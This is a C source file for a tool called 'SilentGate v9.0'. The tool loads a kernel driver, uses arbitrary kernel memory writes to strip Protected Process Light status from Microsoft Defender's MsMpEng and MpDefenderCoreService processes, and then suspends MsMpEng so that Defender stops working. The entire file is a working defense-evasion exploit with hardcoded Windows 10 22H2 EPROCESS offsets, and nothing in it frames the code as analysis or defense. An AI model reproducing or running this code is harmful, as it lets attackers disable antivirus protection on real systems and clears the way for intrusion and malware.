/*
 * SilentGate v9.0 - EPROCESS PPL Remover
 * Author: JarDani
 * Windows 10 22H2 (19045)
 * EPROCESS.Protection offset = 0x87A
 * Sets Protection byte to 0x00 -> removes PPL
 * Then NtSuspendProcess works from user mode
 */
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct { ULONG64 address; ULONG size; UCHAR data[256]; } SG_MEM;
static HANDLE g_h = INVALID_HANDLE_VALUE;

/* Windows 10 22H2 EPROCESS offsets */
#define EPROCESS_UNIQUEPID      0x440
#define EPROCESS_ACTIVELINKS    0x448
#define EPROCESS_PROTECTION     0x87A

BOOL vm_read(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_READ_VIRTUAL,
        &req,sizeof(req),buf,size,&bytes,NULL);
}

BOOL vm_write(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    if(req.size>0) memcpy(req.data,buf,req.size);
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_WRITE_VIRTUAL,
        &req,sizeof(req),&req,sizeof(req),&bytes,NULL);
}

int load_driver(const char* path) {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(ex){SERVICE_STATUS ss;ControlService(ex,SERVICE_CONTROL_STOP,&ss);
        DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
    SC_HANDLE svc=CreateServiceA(scm,"SilentGate","SilentGate",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if(!svc){CloseServiceHandle(scm);return 0;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc);CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(svc){SERVICE_STATUS ss;ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500);DeleteService(svc);CloseServiceHandle(svc);}
    CloseServiceHandle(scm);
}

DWORD64 get_ntos() {
    DWORD n=0; EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n); EnumDeviceDrivers(d,n,&n);
    DWORD64 base=0; char name[MAX_PATH];
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        GetDeviceDriverBaseNameA(d[i],name,MAX_PATH);
        if(_stricmp(name,"ntoskrnl.exe")==0||_stricmp(name,"ntkrnlmp.exe")==0)
            {base=(DWORD64)d[i];break;}
    }
    free(d); return base;
}

DWORD64 get_export(DWORD64 base, const char* name) {
    char path[MAX_PATH]; GetSystemDirectoryA(path,MAX_PATH);
    strcat(path,"\\ntoskrnl.exe");
    HMODULE h=LoadLibraryExA(path,NULL,DONT_RESOLVE_DLL_REFERENCES);
    FARPROC f=GetProcAddress(h,name);
    DWORD64 off=(DWORD64)f-(DWORD64)h; FreeLibrary(h);
    return base+off;
}

/* Find EPROCESS by PID using PsInitialSystemProcess list walk */
DWORD64 find_eprocess(DWORD64 ntos, DWORD target_pid) {
    /* Get PsInitialSystemProcess - points to System EPROCESS */
    DWORD64 psisp_addr = get_export(ntos, "PsInitialSystemProcess");
    if(!psisp_addr) return 0;

    /* Read the pointer value */
    DWORD64 system_eprocess=0;
    vm_read(psisp_addr, &system_eprocess, 8);
    if(!system_eprocess) return 0;

    printf("[EPROCESS] System EPROCESS: 0x%llX\n", system_eprocess);

    /* Walk ActiveProcessLinks list */
    DWORD64 current = system_eprocess;
    int max_walk = 500;

    while(max_walk--) {
        /* Read PID at offset 0x440 */
        DWORD pid=0;
        vm_read(current+EPROCESS_UNIQUEPID, &pid, 4);

        if(pid==target_pid) {
            return current;
        }

        /* Read Flink of ActiveProcessLinks */
        DWORD64 flink=0;
        vm_read(current+EPROCESS_ACTIVELINKS, &flink, 8);
        if(!flink || flink==current+EPROCESS_ACTIVELINKS) break;

        /* EPROCESS = Flink - offset of ActiveProcessLinks */
        current = flink - EPROCESS_ACTIVELINKS;
    }
    return 0;
}

typedef NTSTATUS (NTAPI *pNtSuspendProcess)(HANDLE);

int main() {
    printf("[V9] SilentGate v9.0 - EPROCESS PPL Remover\n");
    printf("[V9] Author: JarDani\n");
    printf("[V9] Windows 10 22H2 - EPROCESS.Protection offset=0x87A\n\n");

    char drv[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(drv,MAX_PATH,"%s\\sg_driver.sys",dir);

    if(!load_driver(drv)){printf("Load failed\n");getchar();return 1;}
    g_h=CreateFileA("\\\\.\\SilentGate",GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(g_h==INVALID_HANDLE_VALUE){
        printf("Device failed\n");unload_driver();getchar();return 1;}

    printf("[V9] Kernel R/W ready\n\n");

    /* Enable SeDebugPrivilege */
    HANDLE hToken=NULL;
    OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken);
    TOKEN_PRIVILEGES tp={0};
    tp.PrivilegeCount=1;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",
        &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(hToken,FALSE,&tp,0,NULL,NULL);
    CloseHandle(hToken);
    printf("[V9] SeDebugPrivilege enabled\n\n");

    DWORD64 ntos=get_ntos();
    printf("[V9] ntoskrnl: 0x%llX\n\n",ntos);

    /* Find MsMpEng and MpDefenderCoreService PIDs */
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    PROCESSENTRY32 pe; pe.dwSize=sizeof(pe);
    DWORD msmpeng_pid=0, mpcore_pid=0;

    if(Process32First(snap,&pe)) {
        do {
            if(_stricmp(pe.szExeFile,"MsMpEng.exe")==0)
                msmpeng_pid=pe.th32ProcessID;
            if(_stricmp(pe.szExeFile,"MpDefenderCoreService.exe")==0)
                mpcore_pid=pe.th32ProcessID;
        } while(Process32Next(snap,&pe));
    }
    CloseHandle(snap);

    printf("[V9] MsMpEng PID             : %lu\n",msmpeng_pid);
    printf("[V9] MpDefenderCoreService PID: %lu\n\n",mpcore_pid);

    /* Find EPROCESS for MsMpEng */
    DWORD targets[]={msmpeng_pid,mpcore_pid,0};
    const char* names[]={"MsMpEng","MpDefenderCoreService"};

    for(int t=0;t<2;t++){
        if(!targets[t]) continue;

        printf("[V9] Finding EPROCESS for %s (PID %lu)...\n",
            names[t],targets[t]);

        DWORD64 eproc=find_eprocess(ntos,targets[t]);
        if(!eproc){
            printf("[V9] EPROCESS not found\n\n");
            continue;
        }

        printf("[V9] EPROCESS: 0x%llX\n",eproc);

        /* Read current Protection byte */
        BYTE prot=0;
        vm_read(eproc+EPROCESS_PROTECTION,&prot,1);
        printf("[V9] Protection byte: 0x%02X\n",prot);

        /* Remove PPL - set to 0 */
        BYTE zero=0;
        if(vm_write(eproc+EPROCESS_PROTECTION,&zero,1)){
            /* Verify */
            BYTE verify=0;
            vm_read(eproc+EPROCESS_PROTECTION,&verify,1);
            printf("[V9] Protection after patch: 0x%02X\n",verify);
            if(verify==0)
                printf("[V9] PPL REMOVED for %s\n\n",names[t]);
        }
    }

    /* Now try NtSuspendProcess */
    /* IMPORTANT: open handle AFTER PPL removed */
    printf("[V9] Attempting NtSuspendProcess on MsMpEng...\n");
    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    pNtSuspendProcess NtSuspendProcess=
        (pNtSuspendProcess)GetProcAddress(ntdll,"NtSuspendProcess");

    /* Open handle now - PPL is already removed */
    HANDLE hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,msmpeng_pid);
    if(!hProc) hProc=OpenProcess(PROCESS_SUSPEND_RESUME,FALSE,msmpeng_pid);
    if(hProc){
        NTSTATUS status=NtSuspendProcess(hProc);
        printf("[V9] NtSuspendProcess: 0x%X %s\n",
            status, status==0?"SUCCESS":"FAILED");
        if(status==0){
            printf("[V9] MsMpEng FROZEN\n");
            printf("[V9] Defender is comatose\n");
            printf("[V9] Press Enter to resume...\n");
            getchar();
            typedef NTSTATUS (NTAPI *pNtResumeProcess)(HANDLE);
            pNtResumeProcess NtResumeProcess=
                (pNtResumeProcess)GetProcAddress(ntdll,"NtResumeProcess");
            NtResumeProcess(hProc);
            printf("[V9] MsMpEng resumed\n");
        }
        CloseHandle(hProc);
    } else {
        printf("[V9] OpenProcess failed: %lu\n",GetLastError());
    }

    CloseHandle(g_h);
    unload_driver();
    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
